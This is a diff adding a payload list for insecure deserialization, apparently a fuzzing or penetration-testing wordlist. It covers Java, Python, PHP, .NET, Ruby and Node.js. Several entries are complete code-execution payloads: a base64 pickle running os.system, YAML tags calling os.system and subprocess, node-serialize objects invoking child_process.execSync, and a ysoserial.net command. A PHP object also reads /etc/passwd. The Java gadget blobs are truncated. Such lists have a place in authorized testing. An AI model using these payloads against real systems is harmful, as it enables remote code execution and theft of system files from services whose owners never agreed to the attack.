@@ -1,0 +1,40 @@
+# Java - ysoserial gadget chains
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA...
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA...
+rO0ABXNyABRqYXZhLm5ldC5VUkwuSGFuZGxl...
+rO0ABXNyACpvcmcuYXBhY2hlLmNvbW1vbnMu...
+rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50Lk...
+
+# Java - magic bytes / detection
+aced0005
+rO0AB
+H4sIAAAAAAAA
+
+# Python - pickle RCE
+cos\nsystem\n(S'id'\ntR.
+gASVKAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==
+
+# Python - YAML unsafe load
+!!python/object/apply:os.system ['id']
+!!python/object/new:subprocess.check_output [['id']]
+
+# PHP - unserialize POP chains
+O:8:"stdClass":1:{s:4:"test";s:4:"data";}
+O:14:"BadMethodClass":1:{s:3:"cmd";s:2:"id";}
+a:2:{i:0;s:4:"test";i:1;O:8:"stdClass":0:{}}
+phar://uploads/evil.phar/test.txt
+O:7:"Archive":1:{s:8:"filename";s:11:"/etc/passwd";}
+
+# .NET - BinaryFormatter / ViewState
+AAEAAAD/////AQAAAA...
+/wEy...
+__VIEWSTATE=/wEPDwULLTE2...
+ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c 'id'
+
+# Ruby - Marshal.load
+\x04\x08o:\x15Gem::Requirement\x06...
+BAhvOhhHZW06OlJlcXVpcmVtZW50...
+
+# Node.js - node-serialize
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()"}
+{"username":"_$$ND_FUNC$$_function(){return require('child_process').execSync('whoami').toString()}()"}
